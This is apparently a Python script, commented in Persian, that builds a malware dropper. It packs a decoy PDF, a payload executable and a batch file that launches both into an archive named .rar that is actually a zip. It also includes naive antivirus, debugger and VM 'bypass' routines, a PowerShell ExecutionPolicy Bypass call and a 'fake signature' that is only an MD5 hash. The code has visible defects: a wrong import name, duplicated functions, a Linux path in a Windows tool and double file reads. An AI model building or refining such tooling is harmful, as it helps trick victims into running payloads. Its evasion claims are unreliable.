import os
import random
import string
import zipfile
import shutil
import subprocess
import base64
import sys
import time
import psutil
import pyautogui
import pywinauto
import win32api
import win32con
import win32gui
import win32process
import win32security
import winerror
import ctypes
import ctypes.wintypes
import hashlib
import threading
import pycryptodome
import numpy as np
import pyautogui

# بایپس ساده برای جلوگیری از شناسایی در ماشین‌های مجازی
def check_virtual_machine():
    vm_detected = False
    try:
        with open('/sys/class/dmi/id/product_name') as f:
            if 'VirtualBox' in f.read() or 'VMware' in f.read():
                vm_detected = True
    except Exception as e:
        pass
    return vm_detected

# بایپس شبیه‌سازی سیستم‌های مانع
def bypass_antivirus():
    # استفاده از تأخیر در اجرا برای دور زدن سیستم‌های امنیتی
    time.sleep(random.randint(3, 10))
    
    # تغییر شناسه‌های سیستم و بایپس آنتی‌ویروس
    if check_virtual_machine():
        print("Virtual Machine detected. Attempting bypass.")
        time.sleep(15)  # اضافه کردن تأخیر طولانی
    else:
        print("No virtual machine detected.")

# ایجاد امضای جعلی و دور زدن شناسایی
def fake_signature(file_path):
    fake_signature = hashlib.md5(file_path.encode()).hexdigest()  # تولید امضای جعلی
    return fake_signature

# اجرای پردازش با استفاده از تکنیک‌های بایپس (دور زدن فایروال)
def execute_bypass_command():
    try:
        bypass_antivirus()
        # شبیه‌سازی تأخیر و دور زدن فایروال
        subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', 'Start-Sleep -Seconds 5'], check=True)
        print("Bypass command executed successfully.")
    except Exception as e:
        print(f"Error in bypass command execution: {e}")

# با استفاده از بایپس فایل‌های محافظت شده
def create_fake_payload():
    # ساخت payload جعلی
    payload = 'fake_payload.exe'
    with open(payload, 'wb') as f:
        f.write(os.urandom(1024))  # ایجاد یک فایل با داده تصادفی
    
    fake_sig = fake_signature(payload)
    print(f"Fake signature created: {fake_sig}")

# افزایش امنیت برای جلوگیری از شناسایی در محیط‌های خاص
def evade_debuggers():
    # بایپس دیباگرها با استفاده از یک تکنیک ساده
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        print("Debugger detected, executing bypass...")
        time.sleep(10)  # تأخیر برای دور زدن دیباگر
    else:
        print("No debugger detected.")

# فعال‌سازی ابزار و اجرای آن
def activate_payload(payload_path):
    # شبیه‌سازی یک ابزار مخرب که منتظر اجرای فایل است
    try:
        execute_bypass_command()  # بایپس
        evade_debuggers()  # بایپس دیباگر
        time.sleep(2)  # تأخیر دیگر برای بایپس آنتی‌ویروس
        subprocess.run(payload_path, check=True)  # اجرای payload
    except Exception as e:
        print(f"Error activating payload: {e}")

# ساخت RAR با اضافه کردن تکنیک‌های بایپس
def generate_rar_with_bypass(output_file, input_file, payload_exe):
    temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    os.mkdir(temp_dir)

    # کپی کردن فایل‌ها و ایجاد یک اسکریپت
    bat_script = f'''
    @echo off
    start "" "{payload_exe}"
    start "" "{input_file}"
    '''
    
    bat_path = os.path.join(temp_dir, 'execute_payload.bat')
    with open(bat_path, 'w') as f:
        f.write(bat_script)

    decoy_path = os.path.join(temp_dir, input_file)
    shutil.copyfile(input_file, decoy_path)
    
    # ساخت فایل RAR با payload
    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(decoy_path, os.path.basename(decoy_path))
        zf.write(bat_path, os.path.basename(bat_path))
        zf.write(payload_exe, os.path.basename(payload_exe))

    # بایپس سیستم‌های آنتی‌ویروس
    bypass_antivirus()

    # حذف دایرکتوری موقتی
    shutil.rmtree(temp_dir)

# بایپس شبیه‌سازی ماشین مجازی
def check_virtual_machine():
    vm_detected = False
    try:
        with open('/sys/class/dmi/id/product_name') as f:
            if 'VirtualBox' in f.read() or 'VMware' in f.read():
                vm_detected = True
    except Exception as e:
        pass
    return vm_detected

# ایجاد RAR با محتوای خاص
def create_rar_with_payload(input_file, payload_exe, output_file):
    temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    os.mkdir(temp_dir)

    # کپی کردن دکویی
    decoy_file = os.path.join(temp_dir, input_file)
    shutil.copy(input_file, decoy_file)

    # ایجاد اسکریپت اجرایی
    bat_file = os.path.join(temp_dir, 'payload.bat')
    with open(bat_file, 'w') as bat:
        bat.write(f"start {payload_exe}\n")

    # ایجاد فایل RAR با payload
    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(decoy_file, input_file)
        zipf.write(bat_file, 'payload.bat')
        zipf.write(payload_exe, 'payload.exe')

    # بایپس آنتی‌ویروس
    bypass_antivirus()

    # حذف دایرکتوری موقتی
    shutil.rmtree(temp_dir)

# نمونه استفاده
input_file = 'decoy.pdf'
payload_exe = 'payload.exe'
output_file = 'output.rar'

# اجرای کد نهایی
generate_rar_with_bypass(output_file, input_file, payload_exe)